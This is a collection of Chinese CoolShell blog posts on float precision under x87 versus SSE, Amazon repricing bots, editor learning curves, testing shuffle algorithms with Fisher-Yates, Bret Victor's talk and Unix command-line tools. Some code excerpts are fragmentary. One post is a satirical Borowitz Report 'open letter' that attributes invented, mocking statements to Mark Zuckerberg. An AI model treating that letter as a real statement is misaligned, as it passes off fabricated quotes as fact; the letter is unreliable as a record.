而在VS2012中C++，编译选项可以设置(代码生成中).aspx)可选，/fp:[precise | fast | strict]，本例中Release 32位下用precise 或者 strict将得到合理的结果(-202014160)，fast将产生正确的结果(-202014162), fast debug/release下结果也不一样哦(release下才优化了)。64系统下各个结果可以大家自己去测试下(Debug/Release)，分别看看VS编译后产生的中间代码长什么样。（陈皓注：我的VS2012在debug编译下，无论你怎么设置/fp的参数值，汇编都是一样的，使用SSE指令，而Release就不一样了，但是我的release下看代码的汇编非常怪异和源代码对上号，多年不用Windows开发了，对VS的使用仅停留在VC6++/VC2005上）所以，我们在从x87 FPU指令向SSE指令做代码移植的时候，我们可能会遇到向这样的浮点数的精度问题，这个精度问题会多次科学计算中会更糟糕。 **这个问题并不简单的只是在32位和64位中的系统出算，这个问题主要还是看语言编译器的实现** 。在更为高级的语言中，如：C99或Fortran 2003中，引入了“long double”来做可扩展双精度（Extension Double），这样就可以消除更多的精度问题。
下面我们把程序改成long double，（注：其中的类型变成long double）return 0;     }用gdb的disassemble /m main你会看到其中的运算的汇编如下（使用了fmlp指令）：//linux 32位系统     8	    long double v321 = p3x * p2y;     0x08048633 <+63>:	fldt   0x10(%esp)     0x08048637 <+67>:	fldt   0x20(%esp)     0x0804863b <+71>:	fmulp  %st,%st(1)     0x0804863d <+73>:	fstpt  0x30(%esp)//linux 64位系统     8           long double v321 = p3x * p2y;     0x0000000000400818 <+52>:    fldt   -0x30(%rbp)     0x000000000040081b <+55>:    fldt   -0x20(%rbp)     0x000000000040081e <+58>:    fmulp  %st,%st(1)     0x0000000000400820 <+60>:    fstpt  -0x10(%rbp)
我们可以看到，32位系统和64位系统使用了同样的汇编指令（当然，我没有那么多物理机，我只是在VMWare Play的虚拟机上测试的，所以上面的示例并不一定适用于所有的地方，另外，C/C++语言和编译器和平台有非常大的关系） ，原因自然是我们用到了long double这个扩展双精度的数据类型。（注：如果你用double或float，在Linux上，32位用x87 FPU 指令编译，而64位用SSE指令编译）好了，我们再回到C#上来，C#的浮点是支持该标准的，其中其官方文档.aspx)也提到了浮点运算可能会产生比返回类型更高精度的值（正如上面的返回值精度就超过了float的精度），并说明如果硬件支持可扩展浮点精度的话，那么 **所有的** 浮点运算都将用此精度进行以提高效率，举个例子x*y/z, x*y的值可能都在double的能力范围之外了，但真实情况可能除以z后又能把结果拉回到double范围内，这样的话，用了FPU的结果就会得到一个准确的double值，而非FPU的就是无穷大之类的了。所以，对于C#来说，你显然无法找到一个像C/C++一样的利用编译器选项的来解决这个问题的“解决方案”（其实，用编译器参数是一个伪解决方案）。
**而且，要解决这个问题也不是要修改编译器选项，因为这个问题明显不是FPU或是SSE的问题，FPU是个过时的技术，SSE才是合理的技术，所以， 如果你不想你的浮点数在计算上有什么问题，而且你需要精度准确，正确的解决方案不是搞编译参数，而是——你一定要使用精度更高字节数更多的数据类型，比如：double 或是long double。**另外，大家在写代码的时候得保证实际运行环境/测试环境/开发环境的 **一致性(包括OS架构啊、编译选项等)** 啊（ **尤其是C/C++ 而且，编译器上的参数可能会有很多坑，而且有些坑可能会掩盖你程序中的问题** ），不然莫名其妙的问题会产生（本文就是开发环境与运行环境不一致导致的问题，纠结了好久才发现是这个原因）；遇到涉及浮点运算的时候别忘了有可能是这个原因产生的； **float/double混用的情况得特别注意** 。**Reference：**[1] C# Language Specification Floating point types.aspx)   [2] Are floating-point numbers consistent in C#? Can they be?
[3] The FPU Instruction Set#### **附录**##### **80838.0f * -2499.0f = -202014160.0浮点运算过程的说明**32位浮点数在计算机中的表示方式为：1位符号位(s)-8位指数位(E)-23位有效数字(M)。   32位Float = (-1)^s * (1+m) * 2^(e-127), 其中e是实际转换成1.xxxxx*2^e的指数,m是前面的xxxxx(节约1位)80838.0f = 1 0011 1011 1100 0110.0= 1.00111011110001100*2^16   有效位M = 0011 1011 1100 0110 0000 000   指数位E = 16 + 127 = 143 = 10001111   内部表示 80838.0 = 0 [1000 1111] [0011 1011 1100 0110 0000 000]   = 0100 0111 1001 1101 1110 0011 0000 0000   = 47 9d e3 00 //实际调试时看到的内存值 可能是00 e3 9d 47是因为调试环境用了小端表示法法：低位字节排内存低地址端，高位排内存高地址
-2499.0 = -100111000011.0 = -1.001110000110 * 2^11   有效位M = 0011 1000 0110 0000 0000 000   指数位E = 11+127=138= 10001010   符号位s = 1   内部表示-2499.0 = 1 [10001010] [0011 1000 0110 0000 0000 000]   =1100 0101 0001 1100 0011 0000 0000 0000   =c5 1c 30 0080838.0 * -2499.0 = ?首先是指数 e = 11+16 = 27   指数位E = e + 127 = 154 = 10011010   有效位相乘结果为 1.1000 0001 0100 1111 1011 1010 01 //可以自己动手实际算下   实际中只能有23位，后面的被截断即1000 0001 0100 1111 1011 1010 01   相乘结果内部表示=1[10011010][1000 0001 0100 1111 1011 101]   = 1100 1101 0100 0000 1010 0111 1101 1101   = cd 40 a7 dd
结果 = -1.1000 0001 0100 1111 1011 101 *2^27   = -11000 0001 0100 1111 1011 1010000   = -202014160   再转成double后还是-202014160.如果是FPU的话，上面的有效位结果不会被截断，即   FPU结果 = -1.1000 0001 0100 1111 1011 101 **001** *2^27   = -11000 0001 0100 1111 1011 101 **001** 0   = -202014162全文完，若本文有纰漏之处欢迎指正。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# Amazon的书为什么卖到了$2000万作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近，Amazon的新闻比较多，除了Amazon的云平台宕机外，还有一个被热炒的新闻是在Amazon的书店里，有一本书要买$23,698,655.93美元，相当于1亿5千万人民币（如下图所示），这个事情是由UC Berkeley的生物学家Michael Eisen发现的，然后他在他的博客上写了一篇文章来说明这个事情。
这本书是1992年，现在绝版了，生物学家决定上Amazon找一下，结果看到了有两本新书，还有一些二手的，二手书价比较正常，但是那两个新书的价都上了百万。这个生物学家还写了邮件给原作者和原作者开了玩笑。呵呵。一般人可能就把这个事当成个笑话了，不过，教授就是教授，它还认真的研究了一下为什么会这样。首先，这个不是Amazon的订价的问题，这是Amazon的第三方商户平台两个商户报价，一个商户叫profnath，另一个商户叫bordeebook。我们的生物学教授观察这两个商户的书价了几天，看到了下面的结果：从上面的表中，我们可以看到，profnath商户的价格总是bordeebook的99.83%，而bordeebook的总是比profnath的高27.059%，很明显，这两个商户用的是程序在自动定价——“自动竞价”。* profnath商户想把书买出去，所以，其订价要比最高价要低一些（99.83%），这个很容易理解。   * bordeebook商户为什么要比最高价要高1.27倍呢？合理的解释是，bordeebook并没有这本书，这个商户只是想用更多的选品来吸引买家，这样可以让人觉得他和竞争对手有一样多的选品。所以，他要把价订得高一点，这样就算是被人下单，他可以从别人手里把书买过来，然后再卖给卖家。27%的空间，够他赚了。
因为两个商户订的比例不一样，所以，这两个商户的自动订价系统就成了相互涨价的程序——profnath以差0.17%差价跟上，而bordeebook以27%的幅度甩开，profnth再跟上，bordeebook再甩开……。于是最后的价格就到了$23,698,655.93美金。呵呵。下面，我说说我的收获——* **能力** ：我非常欣赏这位生物学教授的求甚解的态度，这和Linus要求其团队成员的能力如出一辙。赞一个！   * **商业** ：从这两个商户的行为看到了一种相反的商业技巧。profnath 和 bordeebook 都是聪明的商家。   * **电商** ：自动定价系统可能会成为未来电子商务的一个重要的方向。电子商务还有很多东西可以做啊。   * **程序** ：程序设计中需要加上边界条件，最高值和最低值（当然，我能理解为什么这两个商户没有回，因为不同的商品价格差得太大，也许他们也在卖一些几百万的商品）。最后，这本书的网址在这里《The Making of a Fly: The Genetics of Animal Design》，你可以看到价格又在攀升了，昨天我看的是200多美，我写这篇文章此时的价格是近1000美金了。呵呵。
（全文完）**（请勿用于商业用途，转载时请注明作者和出处）**# 主流文本编辑器学习曲线作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下图是几个经典的文本编辑器的学习曲线，不排除其中有调侃和幽默的味道。主流编辑器学习曲线图**注1** ： **Pico** ( **PI** ne **CO** mposer)是Unix操作系统中最常见的三种文字处理软件之一，具有文字编辑、搜索、拼写检查、文件浏览和段对齐功能，适合高效地编辑短小的文件。Pico是由华盛顿大学开发的免费软件，随着pine电子邮件处理软件发布。它是在Emacs的基础上以pine的邮件编辑为目标而开发的，所以其指令集是Emacs的子集，但是由于在界面上有提示快捷键，相对于vi和Emacs来说更加容易使用。由于Pico虽然是免费软件，但是它并不是开源软件，所以很多Linux版本并不包含Pico。这些版本通常提供一个界面类似的开源软件nano——Pico的克隆版。**注2** ：图中的纵横坐标没有标明。我所理解的是——X轴是熟练程度，Y轴是技能。于是对于notepad 来说，技能和熟练程度呈正比。对于VS来说，熟练程度越大，所需要技能先是越来越多，而随着熟练程度的增长，你需要的技能也越少。而对于VI来说，一开始就需要相当大的技能，但一旦掌握这些技能，则你将会越来越熟练。而对于emacs来说，技能和熟练程度是呈旋涡状。
# 如何测试洗牌程序作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我希望本文有助于你了解测试软件是一件很重要也是一件不简单的事。我们有一个程序，叫ShuffleArray()，是用来洗牌的，我见过N多千变万化的ShuffleArray()，但是似乎从来没人去想过怎么去测试这个算法。所以，我在面试中我经常会问应聘者如何测试ShuffleArray()，没想到这个问题居然难倒了很多有多年编程经验的人。对于这类的问题，其实，测试程序可能比算法更难写，代码更多。而这个问题正好可以加强一下我在《我们需要专职的QA吗？》中我所推崇的——开发人员更适合做测试的观点。我们先来看几个算法（ **第一个用递归二分随机抽牌，第二个比较偷机取巧，第三个比较通俗易懂** ）目录* 递归二分随机抽牌   * 快排Hack法   * 大多数人的实现   * 如何测试   * 正确的算法   * 如何写测试案例   * 注意   * 附录#### 递归二分随机抽牌有一次是有一个朋友做了一个网页版的扑克游戏，他用到的算法就是想模拟平时我们玩牌时用手洗牌的方式，是用递归+二分法，我说这个程序恐怕不对吧。他觉得挺对的，说测试了没有问题。他的程序大致如下（原来的是用Javascript写的，我在这里凭记忆用C复现一下）：
//递归二分方法     const size_t MAXLEN = 10;     const char TestArr[MAXLEN] = {'A','B','C','D','E','F','G','H','I','J'};int pos = rand() % len;     RecurArr[cnt++] = arr[pos];     if (len==1) return;     ShuffleArray_Recursive_Tmp(arr, pos);     ShuffleArray_Recursive_Tmp(arr+pos+1, len-pos-1);     }随便测试几次，还真像那么回事：第一次：D C A B H E G F I J     第二次：A G D B C E F J H I     第三次：A B H F C E D G I J     第四次：J I F B A D C E H G     第五次：F B A D C E H G I J#### 快排Hack法让我们再看一个hack 快排的洗牌程序（只看算法，省去别的代码）：运行个几次，感觉得还像那么回事：
第一次：H C D J F E A G B I     第二次：B F J D C E I H G A     第三次：C G D E J F B I A H     第四次：H C B J D F G E I A     第五次：D B C F E A I H G J看不出有什么破绽。#### 大多数人的实现下面这个算法是大多数人的实现，就是for循环一次，然后随机交换两个数跑起来也还不错，洗得挺好的。第一次：G F C D A J B I H E     第二次：D G J F E I A H C B     第三次：C J E F A D G B H I     第四次：H D C F A E B J I G     第五次：E A J F B I H G D C但是上述三个算法哪个的效果更好？好像都是对的。 **一般的QA或是程序员很有可能就这样把这个功能Pass了** 。但是事情并没有那么简单……#### 如何测试在做测试之前，我们还需要了解一下一个基本知识—— **PC机上是做不出真随机数的，只能做出伪随机数。真随机数需要硬件支持** 。但是不是这样我们就无法测试了呢，不是的。我们依然可以测试。
我们知道，洗牌洗得好不好，主要是看是不是够随机。那么如何测试随机性呢？试想，我们有个随机函数rand()返回1到10中的一个数，如果够随机的话，每个数返回的概率都应该是一样的，也就是说每个数都应该有10分之1的概率会被返回。一到概率问题，我们只有一个方法来做测试，那就是用统计的方式。也就是说，你调用rand()函数100次，其中，每个数出现的次数大约都在10次左右。（注意：我用了左右，这说明概率并不是很准确的）不应该有一个数出现了15次以上，另一个在5次以下，要是这样的话，这个函数就是错的。举一反三，测试洗牌程序也一样，需要通过概率的方式来做统计，是不是每张牌出现在第一个位置的次数都是差不多的。于是，这样一来上面的程序就可以很容易做测试了。下面是测试结果（ **测试样本1000次——列是每个位置出现的次数，行是各个字符的统计** ，出现概率应该是1/10，也就是100次）：**递归随机抽牌的方法**很明显，这个洗牌程序太有问题。算法是错的！1    2    3    4    5    6    7    8    9    10     ----------------------------------------------------     A | 101  283  317  208   65   23    3    0    0    0     B | 101  191  273  239  127   54   12    2    1    0     C | 103  167  141  204  229  115   32    7    2    0     D | 103  103   87  128  242  195  112   26    3    1     E | 104   83   62   67  116  222  228   93   22    3     F |  91   58   34   60   69  141  234  241   65    7     G |  93   43   35   19   44  102  174  274  185   31     H |  94   28   27   27   46   68   94  173  310  133     I | 119   27   11   30   28   49   64   96  262  314     J |  91   17   13   18   34   31   47   88  150  511
**快排Hack法**看看对角线（从左上到右下）上的数据，很离谱！所以，这个算法也是错的。1    2    3    4    5    6    7    8    9    10     -----------------------------------------------------     A |   74  108  123  102   93  198   40   37   52  173     B |  261  170  114   70   49   28   37   76  116   79     C |  112  164  168  117   71   37   62   96  116   57     D |   93   91  119  221  103   66   91   98   78   40     E |   62   60   82   90  290  112   95   98   71   40     F |   46   60   63   76   81  318   56   42   70  188     G |   72   57   68   77   83   39  400  105   55   44     H |   99   79   70   73   87   34  124  317   78   39     I |  127  112  102   90   81   24   57   83  248   76     J |   54   99   91   84   62  144   38   48  116  264
**大多数人的算法**我们再来看看大多数人的算法。还是对角线上的数据有问题，所以，还是错的。1    2    3    4    5    6    7    8    9    10     -----------------------------------------------------     A |  178   98   92   82  101   85   79  105   87   93     B |   88  205   90   94   77   84   93   86  106   77     C |   93   99  185   96   83   87   98   88   82   89     D |  105   85   89  190   92   94  105   73   80   87     E |   97   74   85   88  204   91   80   90  100   91     F |   85   84   90   91   96  178   90   91  105   90     G |   81   84   84  104  102  105  197   75   79   89     H |   84   99  107   86   82   78   92  205   79   88     I |  102   72   88   94   87  103   94   92  187   81     J |   87  100   90   75   76   95   72   95   95  215
#### 正确的算法下面，我们来看看性能高且正确的算法—— Fisher_Yates算法这个算法不难理解，看看测试效果（效果明显比前面的要好）：1    2    3    4    5    6    7    8    9    10     -----------------------------------------------------     A |  107   98   83  115   89  103  105   99   94  107     B |   91  106   90  102   88  100  102   97  112  112     C |  100  107   99  108  101   99   86   99  101  100     D |   96   85  108  101  117  103  102   96  108   84     E |  106   89  102   86   88  107  114  109  100   99     F |  109   96   87   94   98  102  109  101   92  102     G |   94   95  119  110   97  112   89  101   89   94     H |   93  102  102  103  100   89  107  105  101   98     I |   99  110  111  101  102   79  103   89  104  102     J |  105  112   99   99  108  106   95   95   99   82
但是我们可以看到还是不完美。因为我们使用的rand()是伪随机数，不过已经很不错的。最大的误差在20%左右。我们再来看看洗牌100万次的统计值，你会看到误差在6%以内了。这个对于伪随机数生成的程序已经很不错了。1       2     3       4      5      6      7      8     9      10     -------------------------------------------------------------------------     A | 100095  99939 100451  99647  99321 100189 100284  99565 100525  99984     B |  99659 100394  99699 100436  99989 100401  99502 100125 100082  99713     C |  99938  99978 100384 100413 100045  99866  99945 100025  99388 100018     D |  99972  99954  99751 100112 100503  99461  99932  99881 100223 100211     E | 100041 100086  99966  99441 100401  99958  99997 100159  99884 100067     F | 100491 100294 100164 100321  99902  99819  99449 100130  99623  99807     G |  99822  99636  99924 100172  99738 100567 100427  99871 100125  99718     H |  99445 100328  99720  99922 100075  99804 100127  99851 100526 100202     I | 100269 100001  99542  99835 100070  99894 100229 100181  99718 100261     J | 100268  99390 100399  99701  99956 100041 100108 100212  99906 100019
#### 如何写测试案例测试程序其实很容易写了。就是，设置一个样本大小，做一下统计，然后计算一下误差值是否在可以容忍的范围内。比如：* 样本：100万次   * 最大误差：10%以内   * 平均误差：5%以内 （或者：90%以上的误差要小于5%）#### 注意其实，以上的测试只是测试了牌在各个位置的概率。这个还不足够好。因为还可能会现在有Patten的情况。如：每次洗牌出来的都是一个循环顺序数组。这完全可以满足我上面的测试条件。但是那明显是错的。 **所以，还需要统计每种排列的出现的次数** ，看看是不是均匀。但是， **如果这些排列又是以某种规律出现的呢** ？看来，这没完没了了。测试的确是一个很重要，并不简单的事情。谢谢所有参与讨论的人。#### 附录之前忘贴了一个模拟我们玩牌洗牌的算法，现补充如下：//两手洗牌     for (int i=1; i<mid; i+=2){     char tmp = arr[i];     arr[i] = arr[mid+i];     arr[mid+i] = tmp;     }//随机切牌     char *buf = (char*)malloc(sizeof(char)*len);
memset(buf, 0, len);     strncpy(buf, arr, start);     strncpy(arr, arr+start, numCards);     strncpy(arr+numCards, buf, start);     }     free(buf);}     }我们来看看测试结果：（10万次）效果更好一些，误差在2%以内了。1       2     3       4      5      6      7      8     9      10     -------------------------------------------------------------------------     A |  10002   9998   9924  10006  10048  10200   9939   9812  10080   9991     B |   9939   9962  10118  10007   9974  10037  10149  10052   9761  10001     C |  10054  10100  10050   9961   9856   9996   9853  10016   9928  10186     D |   9851   9939   9852  10076  10208  10003   9974  10052   9992  10053     E |  10009   9915  10050  10037   9923  10094  10078  10059   9880   9955     F |  10151  10115  10113   9919   9844   9896   9891   9904  10225   9942     G |  10001  10116  10097  10030  10061   9993   9891   9922   9889  10000     H |  10075  10033   9866   9857  10170   9854  10062  10078  10056   9949     I |  10045   9864   9879  10066   9930   9919  10085  10104  10095  10013     J |   9873   9958  10051  10041   9986  10008  10078  10001  10094   9910
（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# Bret Victor – Inventing on Principle作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnBret Victor（简历） – 苹果公司的UI交互设计师（大神级的人），在 CUSEC（ _Canadian University Software Engineering Conference_ ） 上做了一个题为 “Inventing on Principle” 的演讲（vimeo视频链接），这个演讲中展示了五个示例：* 用程序画树。如何把程序绘图变成实时的，如何把程序和图映射起来。   * 游戏调试。在实时编程的基础上，可以更容易的让你看到程序参数对游戏的调整，甚至对游戏过程的可视化调试。   * 算法调试。在写二分查找算法时可以实时看到程序的执行过程。边写边看到。   * 电路图。可以实时地看到电路图中各个部件的对1/0信号的处理。   * 动画。一种比flash制作动画更NB 的方法。
下面是优酷上的视频——你一定会被示例中的那些编程工具所震撼！不过，Bret并不是在说什么编程，也不是在说什么技术，他是在说 How to live your life。他认为，在我们的生活当中，我们听到太多的诸如：“跟随你的喜好”、“跟随你的兴趣”，“跟随你的热情”之类的东西，但他更认为，更应该是“跟随一个原则 follow you principle”，他认为真正能让你把事做正确的不是你的喜好，不是你的兴趣，也不是热情，而一个做事的原则。在这个演讲中Bret介绍了他自己的原则和他人的原则，供你参考和并找到你的原则从而live in your life。Bret的原则是，他觉得人总是会有很多想法，而把这些想法变成现实是一件非常重要的事，也是最难的事。他觉得当我们在写代码实现一个东西的时候，在实现一个游戏，算法，电路，动画的时候，人很难把自己脑海里的东西映射成现实的东西，因为一个想法变成现实，需要反反复复的调整，如果看不见，就没办法调整。而我们在写好程序，需要编译程序，运行程序，才能看到结果，之后，有些东西发现并不满意，需要做调整，于是需要猜着去改一下程序，再编译运行，再看结果，于是，这个调整的过程相当令人痛苦，因为代码里的那些数字，我需要一点一点地去试，调大调小，总是不能调到我们想要的结果，从而让人无法正常思考。所以，他的原则是—— **创造者需要对自己的创造的东西有实时的反馈** 。于是出现了视频中的实时编程的那些示例。（其实，这个东西和Firebug很相似，我还记得以前和朋友说过，如果写C/C++程序也能有像Firebug的这种工具就好了，现在果然离实现不远了）
Bret说起他的动机的时候，他说，他把这个事当成了一种责任而不是一种机会。他说，这就好像我们听到的：审查机制，性别歧视，环境破坏，违反人权等这些问题，绝大多数人是不会把这些事当成一个机会的，而那些有责任感的人会把解决这些问题当作一种责任。同样，当他看到我们被工具或环境限制住了我们创造东西的过程时，他并不觉得这是一个可以发明更好的产品的机会，甚至这是开创自己事业的机会，或是对社会做贡献的机会。他认为想法相当的宝贵，如果一个好的想法推动不了的时候，他会很难受，就像看到一场灾难一样，他觉得，让大家的想法能够顺的进行，这是他的一个责任。后面他，举到了很多人的例子，Larry Tesler – 著名的计算机科学家，前苹果的首席科学家，图形界面的创造者（在“SteveY对Amazon和Google平台的长篇大论”中提到过他）。他在70年代看到人们在使用电脑文本编辑器时，需要按某个键进入某种模式（Mode），然后才能输入（VI）。他觉得这样操作起来很复杂，也很不舒服，所以，他为自己设定了一个原则——“Don’t Mode Me In”，他做了很多尝试，做了一个叫Gypsy的文档编辑器，可以通过拖拽移动字符，而且他还发明了复制粘贴，对于一个没有使用过电脑的人来说，只需半个小时的训练就可以输入文字了。Larry把消除模式设置成了自己的原则或责任。他的个人主页是：http://www.nomodes.com，他的Twitter是 @nomodes，甚至他的车牌也是nomodes.
Elizabeth Cady Stanton，100年前的一个美国的女权主义者，当时，她主张妇女的各项权益，比如参与投票，所有人都以为他疯了，今天看来，她是对的，她消除了性别歧视。这和Larry 很相似，他们都看到了一种文化上的错误，并要预见到了未来的样子，他们都为自己设定了一个原则或是信仰，而去为之奋斗。Doug Engelbart，美国发明家，瑞典人和挪威人后裔。最广为人知的是他发明了鼠标，另外他的小组是人机交互的先锋，开发了超文本系统、网络计算机，以及图形用户界面的先驱；并致力于倡导运用计算机和网络，来协同解决世界上日益增长的紧急而又复杂的问题。Alan Kay，美国计算机科学家，在面向对象编程和窗口式图形用户界面方面作出了先驱性贡献。2003年获得图灵奖。目前担任Viewpoints研究院院长，加州大学伯克利分校兼职教授。曾任Apple公司院士，惠普公司资深院士。他有一句尽人皆知的名言——预测未来的最好办法就是创造未来。他相信如果小孩能够熟练掌握电脑，如果写程序是和读书写字一样成为基础知识，那么人们就掌握了一种新的方式去思考，新的方式去了解世界。他所有发明的东西都基于他自己的原则或信条。
Richard Stallman，是美国自由软件运动的精神领袖、GNU计划以及自由软件基金会（Free Software Foundation）的创立者。作为一个著名的黑客，他的主要成就包括Emacs及后来的GNU Emacs，GNU C 编译器及GDB 调试器。他所写作的GNU通用公共许可证（GNU GPL）是世上最广为采用的自由软件许可证，为copyleft观念开拓出一条崭新的道路。他的原则，是软件必须是自由的，他认为软件的自由是关乎道义上的对错的，关系到人类的自由。他没车没房没结婚没孩子，也不用手机，但他有非常忠实自由的信条和责任感。Bret通过这些例子继续强调——他并不是要大家样做，他只是给大家一个选择。你可以成为一个非常优秀的工程师，非常熟练地掌握了一些技术，你也可以为这个社会做很多贡献，这是成为一个工匠的路，也是大多数人走的路。不过旁边还有一条路，值得去走，那就是解决问题的路，这条路往一头走是创业者，往另一头走是学者，但你需要找到一个你自己的原则，你可能需要很长时间才能找到你的原则，Bret说他花了10年才搞清楚他的原则是什么。个人以为，Bret所说这个原则也好，信条也好，是一种对自己创造力有引导性质的原则和信条，并不是那些已有的原则或信条，否则那只不过是在跟从了，所以，这些原则和信条应该是新的东西，是自己悟出来的东西，这样的原则和信条会导致你有一种责任感向正确的方向去创造。当然，这些原则也不是那些非常笼统和模糊的东西，比如，要创业开公司，要设计出有更好的用户体验的东西，要创造有很多用户使用的产品，或是有更好的收入什么的。其应该是明确的，有指导性的，就像Bret他自己的信条一样——“创造者需要即时的反馈”，就像他演示的那样，当你在一行一行修改你的代码的时候，你可以立即看到代码运行的过程和效果。这个原则可以指导着他要对一切达不到这个原则的东西负责，并引导着他知道应该做什么，不应该做什么，从而去创造新的东西，解决问题。
当然，世界是多元的，每个人都有每个人自己的原则。不同的原则必然会把你导到不同的路上。不管你是否同意，视频中的那些演示是相当令人震撼的。（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 扎克伯格的一封信：关于Facebook IPO作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnMENLO PARK, CA ( ** **The Borowitz Report**** ) – 在Fackbook IPO前夕，Facebook的创始人兼CEO Mark Zuckerberg 给全球股民发表了封公开信：亲爱的股民们：这么多年来，你们已经在Facebook上浪费了你们的时间 ，接下来，你们会得到浪费你们金钱的机会。明天是Facebook的IPO，并且我知道你们一定在想，Facebook怎么就和2000年的.COM泡沫不一样啦？首先，我想告诉你们，以前那些糟糕的dot- com公司玩的是概念和炒作，而没有真正的商业价值。而Facebook不一样，也就是说，我们Facebook是建立在强大的以“疯狂的小鸟”和“一群想像中的羊”的基础上的。
其次，Facebook是世界上最成功的社交网络，我们的用户最近才发现，这个社交网络让人们分享了数以万计别人根本不感兴趣的信息。第三，当某人点击Faceback广告的时候，我们就会挣到钱。而且我们知道，点我们广告的人都不是故意点击，成百万的人点我们的广告是因为那时他们喝醉了。我们完全从iTunes偷到这个有创意的想法。最后，如果你买我们的股票，你将永远不会孤独。据调查，在过去几年里使用facebook的全球9亿用户，他们都有轻微或中等程度的大脑损伤，这影响了他们的作正常判断的能力。所以，这些人都成为你的朋友——Facebook的股民。有了你的帮助，如果明天一切都照计划进行，Facebook IPO将会募到1000亿美金。这是个什么概念，这相当于4到5个摩根大通银行损失的钱。最后一件事：我，Mark Zuckerberg，是否会因此IPO获得180亿美金？ 也许，我正在考虑把希腊买了，但就算是这样，我还是有180亿美金。 LOL.Friend me (粉我),Mark（新闻来源：）# 28个Unix/Linux的命令行神器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
下面是Kristóf Kovács收集的28个Unix/Linux下的28个命令行下的工具（原文链接），有一些是大家熟悉的，有一些是非常有用的，有一些是不为人知的。这些工具都非常不错，希望每个人都知道。本篇文章还在Hacker News上被讨论，你可以过去看看。我以作者的原文中加入了官网链接和一些说明。目录* dstat & sar   * slurm   * vim & emacs   * screen, dtach, tmux, byobu   * multitail   * tpp   * xargs & parallel   * duplicity & rsyncrypto   * nethack & slash’em   * lftp   * ack   * calcurse & remind + wyrd   * newsbeuter & rsstail   * powertop   * htop & iotop   * ttyrec & ipbt   * rsync   * mtr   * socat & netpipes   * iftop & iptraf   * siege & tsung   * ledger   * taskwarrior   * curl   * rtorrent & aria2   * ttytter & earthquake   * vifm & ranger   * cowsay & sl
#### dstat & sariostat, vmstat, ifstat 三合一的工具，用来查看系统性能（我在《性能调优攻略》中提到过那三个xxstat工具）。官方网站：你可以这样使用：`alias dstat='dstat -cdlmnpsy'`!dstat screenshot#### slurm查看网络流量的一个工具官方网站： _Simple Linux Utility for Resource Management_!slurm screenshot#### vim & emacs真正程序员的代码编辑器。!vim screenshot#### screen, dtach, tmux, byobu你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。**Screen**是一个可以在多个进程之间多路复用一个物理终端的窗口管理器。Screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个screen窗口中就像操作一个真实的telnet/SSH连接窗口那样。请参看IBM DeveloperWorks的这篇文章《使用 screen 管理你的远程会话》
!gnu screen screenshot**dtach** 是用来模拟screen的detach的功能的小工具，其可以让你随意地attach到各种会话上 。下图为dtach+dvtm的样子。**tmux** 是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机；当然其功能远不止于此。与screen相比的优点：可以横向和纵向分割窗口，且窗格可以自由移动和调整大小。可在多个缓冲区进行复制和粘贴，支持跨窗口搜索；非正常断线后不需重新detach；…… 有人说—— **与tmux相比，screen简直弱爆了** 。**byobu**是Ubuntu开发的，在Screen的基础上进行包装，使其更加易用的一个工具。最新的Byobu，已经是基于Tmux作为后端了。可通过“byobu- tmux”这个命令行前端来接受各种与tmux一模一样的参数来控制它。Byobu的细节做的非常好，效果图如下：#### multitailMultiTail是个用来实现同时监控多个文档、类似tail命令的功能的软件。他和tail的区别就是他会在控制台中打开多个窗口，这样使同时监控多个日志文档成为可能。他还可以看log文件的统计，合并log文件，过滤log文件，分屏，……。
官网：!multitail screenshot#### tpp终端下的PPT，要是在某某大会上用这个演示PPT，就太TMD的Geek了。官网：!tpp screenshot#### xargs & parallelExecutes tasks from input (even multithread).xargs 是一个比较古老的命令，有简单的并行功能，这个不说了。对于GNU parallel ( online manpage )来说，它不仅能够处理本机上多执行绪，还能分散至远端电脑协助处理。而使用GNU parallel前，要先确定本机有安装GNU parallel / ssh / rsync，远端电脑也要安装ssh。!xargs screenshot#### duplicity & rsyncryptoDuplicity是使用rsync算法加密的高效率备份软件，Duplicity支持目录加密生产和格式上传到远程或本地文件服务器。rsyncrypto 就是 rsync + encryption。对于rsync的算法可参看酷壳的rsync核心算法。Encrypting backup tools.
!duplicity screenshot#### nethack & slash’emNetHack（Wiki），20年历史的古老电脑游戏。没有声音，没有漂亮的界面，不过这个游戏真的很有意思。网上有个家伙说： **如果你一生只做一件事情，那么玩NetHack** 。这句话很惹眼，但也让人觉得这个游戏很复杂不容易上手。其实，这个游戏很虽然很复杂，却容易上手。虽然玩通关很难，但上手很容易。NetHack上有许多复杂的规则，”the DevTeam thinks of everything”（开发团队想到了所有的事情)。各种各样的怪物，各种各样的武器….，有许多spoilers文件来说明其规则。除了每次开始随机生成的地图，每次玩游戏，你也都会碰到奇怪的事情: 因为喝了一种药水，变成了机器人;因为踢坏了商店的门被要求高价赔偿;你的狗为你偷来了商店的东西….. 这有点象人生，你不能完全了解这个世界，但你仍然可以选择自己的面对方式。网上有许多文章所这是最好的电脑游戏或最好的电脑游戏之一。也许是因为它开放的源代码让人赞赏，古老的历史让人宽容，复杂的规则让人敬畏。虽然它不是当前流行的游戏，但它比任何一个当前流行的游戏都更有可能再经受20年的考验。
